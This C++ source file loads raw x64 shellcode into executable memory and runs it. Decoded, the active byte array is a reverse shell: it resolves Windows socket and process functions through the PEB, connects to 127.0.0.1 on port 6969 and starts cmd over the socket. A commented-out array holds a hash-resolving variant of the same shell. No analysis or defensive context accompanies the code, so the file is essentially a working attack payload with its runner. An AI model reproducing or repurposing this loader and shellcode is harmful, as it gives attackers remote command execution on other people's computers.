#include <WinSock2.h>
#include <Windows.h>
#include <iostream>
#pragma comment(lib, "Ws2_32.lib")



unsigned char data[] = {
	0x48, 0x89, 0x5C, 0x24, 0x20, 0x55, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8D, 0x6C, 0x24, 0xA0, 0x48, 0x81, 0xEC, 0x60, 0x01, 0x00, 0x00, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x33, 0xD2, 0x48, 0x8B, 0x48, 0x18, 0x48, 0x8B, 0x41, 0x20, 0x48, 0x8B, 0x08, 0x48, 0x8B, 0x01, 0x48, 0x8B, 0x78, 0x20, 0x48, 0x63, 0x47, 0x3C, 0x44, 0x8B, 0x8C, 0x38, 0x88, 0x00, 0x00, 0x00, 0xB8, 0xFF, 0xFF, 0xFF, 0xFF, 0x4C, 0x03, 0xCF, 0x45, 0x8B, 0x41, 0x20, 0x45, 0x8B, 0x51, 0x18, 0x4C, 0x03, 0xC7, 0x45, 0x85, 0xD2, 0x74, 0x53, 0x48, 0xBB, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x00, 0x49, 0xBB, 0x47, 0x65, 0x74, 0x50, 0x72, 0x6F, 0x63, 0x41, 0x41, 0x8B, 0x08, 0x4C, 0x39, 0x1C, 0x39, 0x75, 0x08, 0x48, 0x39, 0x5C, 0x39, 0x07, 0x0F, 0x44, 0xC2, 0x49, 0x83, 0xC0, 0x04, 0xFF, 0xC2, 0x41, 0x3B, 0xD2, 0x72, 0xE4, 0x85, 0xC0, 0x7E, 0x1F, 0x41, 0x8B, 0x49, 0x24, 0x48, 0x03, 0xCF, 0x48, 0x63, 0xD0, 0x44, 0x0F, 0xB7, 0x04, 0x51, 0x41, 0x8B, 0x49, 0x1C, 0x48, 0x03, 0xCF, 0x46, 0x8B, 0x24, 0x81, 0x4C, 0x03, 0xE7, 0xEB, 0x03, 0x45, 0x33, 0xE4, 0x48, 0x8D, 0x55, 0xA0, 0x4C, 0x89, 0xA5, 0xB0, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xCF, 0xC7, 0x45, 0xA0, 0x4C, 0x6F, 0x61, 0x64, 0xC7, 0x45, 0xA4, 0x4C, 0x69, 0x62, 0x72, 0xC7, 0x45, 0xA8, 0x61, 0x72, 0x79, 0x41, 0xC6, 0x45, 0xAC, 0x00, 0x41, 0xFF, 0xD4, 0x4C, 0x8B, 0xE8, 0xC7, 0x44, 0x24, 0x70, 0x57, 0x73, 0x32, 0x5F, 0x48, 0x8D, 0x4C, 0x24, 0x70, 0xC7, 0x44, 0x24, 0x74, 0x33, 0x32, 0x2E, 0x64, 0x66, 0xC7, 0x44, 0x24, 0x78, 0x6C, 0x6C, 0xC6, 0x44, 0x24, 0x7A, 0x00, 0x41, 0xFF, 0xD5, 0x48, 0x8D, 0x55, 0x80, 0xC7, 0x45, 0x80, 0x57, 0x53, 0x41, 0x53, 0x48, 0x8B, 0xC8, 0xC7, 0x45, 0x84, 0x6F, 0x63, 0x6B, 0x65, 0x48, 0x8B, 0xD8, 0x66, 0xC7, 0x45, 0x88, 0x74, 0x41, 0xC6, 0x45, 0x8A, 0x00, 0x41, 0xFF, 0xD4, 0x48, 0x8D, 0x54, 0x24, 0x50, 0xC7, 0x44, 0x24, 0x50, 0x69, 0x6E, 0x65, 0x74, 0x48, 0x8B, 0xCB, 0xC7, 0x44, 0x24, 0x54, 0x5F, 0x61, 0x64, 0x64, 0x4C, 0x8B, 0xF0, 0x66, 0xC7, 0x44, 0x24, 0x58, 0x72, 0x00, 0x41, 0xFF, 0xD4, 0x48, 0x8D, 0x95, 0xA8, 0x00, 0x00, 0x00, 0xC7, 0x85, 0xA8, 0x00, 0x00, 0x00, 0x63, 0x6F, 0x6E, 0x6E, 0x48, 0x8B, 0xCB, 0xC7, 0x85, 0xAC, 0x00, 0x00, 0x00, 0x65, 0x63, 0x74, 0x00, 0x4C, 0x8B, 0xF8, 0x41, 0xFF, 0xD4, 0x48, 0x8D, 0x55, 0xB0, 0xC7, 0x45, 0xB0, 0x43, 0x72, 0x65, 0x61, 0x48, 0x8B, 0xCF, 0xC7, 0x45, 0xB4, 0x74, 0x65, 0x50, 0x72, 0x48, 0x8B, 0xF0, 0xC7, 0x45, 0xB8, 0x6F, 0x63, 0x65, 0x73, 0x66, 0xC7, 0x45, 0xBC, 0x73, 0x41, 0xC6, 0x45, 0xBE, 0x00, 0x41, 0xFF, 0xD4, 0x48, 0x8D, 0x55, 0x90, 0xC7, 0x45, 0x90, 0x45, 0x78, 0x69, 0x74, 0x48, 0x8B, 0xCF, 0xC7, 0x45, 0x94, 0x54, 0x68, 0x72, 0x65, 0x4C, 0x8B, 0xE0, 0x66, 0xC7, 0x45, 0x98, 0x61, 0x64, 0xC6, 0x45, 0x9A, 0x00, 0xFF, 0x95, 0xB0, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xF8, 0x45, 0x33, 0xC9, 0x33, 0xC0, 0x89, 0x44, 0x24, 0x28, 0x48, 0x89, 0x45, 0xC8, 0x89, 0x44, 0x24, 0x20, 0x8D, 0x50, 0x01, 0x8D, 0x48, 0x02, 0x44, 0x8D, 0x40, 0x06, 0x41, 0xFF, 0xD6, 0x48, 0x8D, 0x4C, 0x24, 0x60, 0xC7, 0x45, 0xC0, 0x02, 0x00, 0x1B, 0x39, 0x48, 0x8B, 0xD8, 0xC7, 0x44, 0x24, 0x60, 0x31, 0x32, 0x37, 0x2E, 0xC7, 0x44, 0x24, 0x64, 0x30, 0x2E, 0x30, 0x2E, 0x66, 0xC7, 0x44, 0x24, 0x68, 0x31, 0x00, 0x41, 0xFF, 0xD7, 0x41, 0xB8, 0x10, 0x00, 0x00, 0x00, 0x89, 0x45, 0xC4, 0x48, 0x8D, 0x55, 0xC0, 0x48, 0x8B, 0xCB, 0xFF, 0xD6, 0x0F, 0x57, 0xC0, 0x0F, 0x11, 0x45, 0xD0, 0x0F, 0x11, 0x45, 0xE0, 0x0F, 0x11, 0x45, 0xF0, 0x0F, 0x11, 0x45, 0x00, 0x0F, 0x11, 0x45, 0x10, 0x0F, 0x11, 0x45, 0x20, 0x48, 0x8D, 0x45, 0x40, 0xC7, 0x45, 0xD0, 0x68, 0x00, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x48, 0x48, 0x8D, 0x95, 0xA0, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x45, 0xD0, 0xC7, 0x45, 0x0C, 0x00, 0x01, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x40, 0x45, 0x33, 0xC9, 0x33, 0xC0, 0x48, 0x89, 0x5D, 0x20, 0x48, 0x89, 0x44, 0x24, 0x38, 0x45, 0x33, 0xC0, 0x48, 0x89, 0x44, 0x24, 0x30, 0x33, 0xC9, 0xC7, 0x44, 0x24, 0x28, 0x00, 0x00, 0x00, 0x08, 0xC7, 0x44, 0x24, 0x20, 0x01, 0x00, 0x00, 0x00, 0x48, 0x89, 0x5D, 0x28, 0x48, 0x89, 0x5D, 0x30, 0xC7, 0x85, 0xA0, 0x00, 0x00, 0x00, 0x63, 0x6D, 0x64, 0x00, 0x41, 0xFF, 0xD4, 0x33, 0xC9, 0xFF, 0xD7, 0x48, 0x8B, 0x9C, 0x24, 0xB8, 0x01, 0x00, 0x00, 0x49, 0x8B, 0xC5, 0x48, 0x81, 0xC4, 0x60, 0x01, 0x00, 0x00, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C, 0x5F, 0x5E, 0x5D, 0xC3
};

//unsigned char data[] = {
//	0x48, 0x89, 0x5C, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x55, 0x57, 0x41, 0x54, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8D, 0xAC, 0x24, 0xF0, 0xFD, 0xFF, 0xFF, 0x48, 0x81, 0xEC, 0x10, 0x03, 0x00, 0x00, 0x33, 0xC0, 0xC7, 0x85, 0x40, 0x02, 0x00, 0x00, 0x63, 0x6D, 0x64, 0x2E, 0x48, 0x83, 0xCB, 0xFF, 0xC7, 0x85, 0x44, 0x02, 0x00, 0x00, 0x65, 0x78, 0x65, 0x00, 0x48, 0x8D, 0x7D, 0xB0, 0xC7, 0x44, 0x24, 0x50, 0x77, 0x73, 0x32, 0x5F, 0xC7, 0x44, 0x24, 0x54, 0x33, 0x32, 0x2E, 0x64, 0x45, 0x33, 0xE4, 0x66, 0xC7, 0x44, 0x24, 0x58, 0x6C, 0x6C, 0x8D, 0x4B, 0x49, 0x44, 0x88, 0x64, 0x24, 0x5A, 0xF3, 0xAA, 0x48, 0x8D, 0x7D, 0x70, 0xC7, 0x44, 0x24, 0x60, 0x57, 0x6D, 0x63, 0x96, 0xB9, 0x98, 0x01, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x64, 0xD6, 0x4B, 0xF2, 0xC4, 0xF3, 0xAA, 0x48, 0x8D, 0x7C, 0x24, 0x70, 0xC7, 0x44, 0x24, 0x68, 0xB0, 0x97, 0x62, 0x5A, 0x8D, 0x4B, 0x11, 0xC7, 0x45, 0x80, 0x5E, 0x12, 0xDD, 0x41, 0xF3, 0xAA, 0x48, 0x8D, 0x7D, 0x00, 0xC7, 0x45, 0x84, 0x49, 0xA3, 0x7E, 0x79, 0x8D, 0x4B, 0x69, 0xC7, 0x45, 0x88, 0xC8, 0xD8, 0x3E, 0x5D, 0xF3, 0xAA, 0x48, 0x8D, 0x7D, 0x98, 0xC7, 0x45, 0x8C, 0x5C, 0x2F, 0xB0, 0xD0, 0x8D, 0x4B, 0x19, 0xC7, 0x45, 0x90, 0x3C, 0x04, 0xD0, 0x41, 0xF3, 0xAA, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0x58, 0x18, 0x49, 0x83, 0xC3, 0x20, 0x49, 0x8B, 0x0B, 0x49, 0x3B, 0xCB, 0x0F, 0x84, 0xD0, 0x01, 0x00, 0x00, 0x4C, 0x8B, 0x49, 0x50, 0x49, 0x8B, 0xC4, 0x66, 0x45, 0x39, 0x21, 0x74, 0x0A, 0x48, 0xFF, 0xC0, 0x66, 0x45, 0x39, 0x24, 0x41, 0x75, 0xF6, 0x4C, 0x8D, 0x14, 0x00, 0x41, 0x8B, 0xFC, 0x4D, 0x8B, 0xC4, 0x4D, 0x85, 0xD2, 0x74, 0x25, 0x43, 0x0F, 0xBE, 0x04, 0x08, 0x8B, 0xD0, 0x2C, 0x41, 0x3C, 0x19, 0x77, 0x03, 0x83, 0xCA, 0x20, 0x03, 0xFA, 0x49, 0xFF, 0xC0, 0xC1, 0xCF, 0x05, 0x4D, 0x3B, 0xC2, 0x72, 0xE3, 0x81, 0xFF, 0x49, 0xCB, 0x0C, 0x1B, 0x74, 0x05, 0x48, 0x8B, 0x09, 0xEB, 0xA7, 0x4C, 0x8B, 0x79, 0x20, 0x4D, 0x85, 0xFF, 0x0F, 0x84, 0x73, 0x01, 0x00, 0x00, 0x41, 0x8B, 0xFC, 0x48, 0x8D, 0x75, 0xB0, 0x4C, 0x8D, 0x74, 0x24, 0x60, 0x41, 0x8B, 0x16, 0x49, 0x8B, 0xCF, 0xE8, 0x7A, 0x01, 0x00, 0x00, 0x48, 0x89, 0x06, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0x50, 0x01, 0x00, 0x00, 0xFF, 0xC7, 0x49, 0x83, 0xC6, 0x04, 0x48, 0x83, 0xC6, 0x08, 0x83, 0xFF, 0x03, 0x72, 0xDA, 0x48, 0x8D, 0x4C, 0x24, 0x50, 0xFF, 0x55, 0xB0, 0x4C, 0x8B, 0xF8, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0x2D, 0x01, 0x00, 0x00, 0x41, 0x8B, 0xFC, 0x48, 0x8D, 0x75, 0xC8, 0x4C, 0x8D, 0x75, 0x80, 0x41, 0x8B, 0x16, 0x49, 0x8B, 0xCF, 0xE8, 0x35, 0x01, 0x00, 0x00, 0x48, 0x89, 0x06, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0x0B, 0x01, 0x00, 0x00, 0xFF, 0xC7, 0x49, 0x83, 0xC6, 0x04, 0x48, 0x83, 0xC6, 0x08, 0x83, 0xFF, 0x05, 0x72, 0xDA, 0xB9, 0x02, 0x02, 0x00, 0x00, 0x48, 0x8D, 0x55, 0x70, 0xFF, 0x55, 0xC8, 0x85, 0xC0, 0x0F, 0x85, 0xC1, 0x00, 0x00, 0x00, 0x8D, 0x78, 0x02, 0x44, 0x89, 0x64, 0x24, 0x28, 0x8B, 0xCF, 0x44, 0x89, 0x64, 0x24, 0x20, 0x45, 0x33, 0xC9, 0x8D, 0x50, 0x01, 0x44, 0x8D, 0x40, 0x06, 0xFF, 0x55, 0xD0, 0x48, 0x8B, 0xD8, 0x48, 0x83, 0xF8, 0xFF, 0x0F, 0x84, 0x98, 0x00, 0x00, 0x00, 0xE8, 0xA8, 0x01, 0x00, 0x00, 0x66, 0x89, 0x7C, 0x24, 0x70, 0x44, 0x8D, 0x47, 0x0E, 0x4C, 0x89, 0x64, 0x24, 0x30, 0x48, 0x8D, 0x54, 0x24, 0x70, 0x4C, 0x89, 0x64, 0x24, 0x28, 0x45, 0x33, 0xC9, 0x8B, 0x08, 0x89, 0x4C, 0x24, 0x74, 0x0F, 0xB7, 0x48, 0x04, 0x66, 0x89, 0x4C, 0x24, 0x72, 0x48, 0x8B, 0xCB, 0x4C, 0x89, 0x64, 0x24, 0x20, 0xFF, 0x55, 0xD8, 0x85, 0xC0, 0x75, 0x5A, 0x48, 0x8D, 0x45, 0x98, 0xC7, 0x45, 0x00, 0x68, 0x00, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x48, 0x48, 0x8D, 0x95, 0x40, 0x02, 0x00, 0x00, 0x48, 0x8D, 0x45, 0x00, 0xC7, 0x45, 0x3C, 0x01, 0x01, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x40, 0x45, 0x33, 0xC9, 0x4C, 0x89, 0x64, 0x24, 0x38, 0x45, 0x33, 0xC0, 0x4C, 0x89, 0x64, 0x24, 0x30, 0x33, 0xC9, 0x44, 0x89, 0x64, 0x24, 0x28, 0xC7, 0x44, 0x24, 0x20, 0x01, 0x00, 0x00, 0x00, 0x66, 0x44, 0x89, 0x65, 0x40, 0x48, 0x89, 0x5D, 0x60, 0x48, 0x89, 0x5D, 0x58, 0x48, 0x89, 0x5D, 0x50, 0xFF, 0x55, 0xB8, 0x48, 0x8B, 0x4D, 0x98, 0x48, 0x85, 0xC9, 0x74, 0x03, 0xFF, 0x55, 0xC0, 0x48, 0x8B, 0x4D, 0xA0, 0x48, 0x85, 0xC9, 0x74, 0x03, 0xFF, 0x55, 0xC0, 0x48, 0x83, 0xFB, 0xFF, 0x74, 0x06, 0x48, 0x8B, 0xCB, 0xFF, 0x55, 0xE0, 0xFF, 0x55, 0xE8, 0x4C, 0x8D, 0x9C, 0x24, 0x10, 0x03, 0x00, 0x00, 0x49, 0x8B, 0x5B, 0x38, 0x49, 0x8B, 0x73, 0x40, 0x49, 0x8B, 0xE3, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5C, 0x5F, 0x5D, 0xC3, 0xCC, 0xCC, 0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x41, 0x56, 0x41, 0x57, 0x48, 0x63, 0x41, 0x3C, 0x45, 0x33, 0xC9, 0x4C, 0x8B, 0xFA, 0x4C, 0x8B, 0xD9, 0x45, 0x8B, 0xD1, 0x44, 0x8B, 0x84, 0x08, 0x88, 0x00, 0x00, 0x00, 0x4C, 0x03, 0xC1, 0x41, 0x8B, 0x70, 0x1C, 0x41, 0x8B, 0x58, 0x20, 0x48, 0x03, 0xF1, 0x41, 0x8B, 0x68, 0x24, 0x48, 0x03, 0xD9, 0x45, 0x8B, 0x70, 0x18, 0x48, 0x03, 0xE9, 0x45, 0x85, 0xF6, 0x74, 0x56, 0x8B, 0x13, 0x49, 0x8B, 0xC9, 0x49, 0x03, 0xD3, 0x44, 0x38, 0x0A, 0x74, 0x09, 0x48, 0xFF, 0xC1, 0x44, 0x38, 0x0C, 0x11, 0x75, 0xF7, 0x45, 0x8B, 0xC1, 0x49, 0x8B, 0xF9, 0x48, 0x85, 0xC9, 0x74, 0x13, 0x0F, 0xBE, 0x04, 0x17, 0x48, 0xFF, 0xC7, 0x44, 0x03, 0xC0, 0x41, 0xC1, 0xC8, 0x05, 0x48, 0x3B, 0xF9, 0x72, 0xED, 0x45, 0x3B, 0xC7, 0x74, 0x0E, 0x41, 0xFF, 0xC2, 0x48, 0x83, 0xC3, 0x04, 0x45, 0x3B, 0xD6, 0x72, 0xBB, 0xEB, 0x0F, 0x41, 0x8B, 0xC2, 0x0F, 0xB7, 0x4C, 0x45, 0x00, 0x44, 0x8B, 0x0C, 0x8E, 0x4D, 0x03, 0xCB, 0x48, 0x8B, 0x5C, 0x24, 0x18, 0x49, 0x8B, 0xC1, 0x48, 0x8B, 0x6C, 0x24, 0x20, 0x48, 0x8B, 0x74, 0x24, 0x28, 0x48, 0x8B, 0x7C, 0x24, 0x30, 0x41, 0x5F, 0x41, 0x5E, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xEB, 0x02, 0x58, 0xC3, 0xE8, 0xF9, 0xFF, 0xFF, 0xFF, 0x7F, 0x00, 0x00, 0x01, 0x1B, 0x39
//};




int main()
{
	//HMODULE h = GetModuleHandleA("Kernel32.dll");
	//FARPROC f = GetProcAddress(h, "ExitThread");

	//printf("%p\n%p\n%llx\n", h, f, (uintptr_t)f - (uintptr_t)h);

	DWORD dwOld = 0;
	PBYTE exec = (PBYTE)VirtualAlloc(0, sizeof(data), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	if (!exec)
	{
		puts("VirtualAlloc");
	}

	WSADATA wsadata = { 0 };
	WSAStartup(MAKEWORD(2, 2), &wsadata);

	memcpy(exec, data, sizeof(data));


	uintptr_t ree = 0;
	//getchar();
	ree = ((uintptr_t(*)())(exec))();


	getchar();

}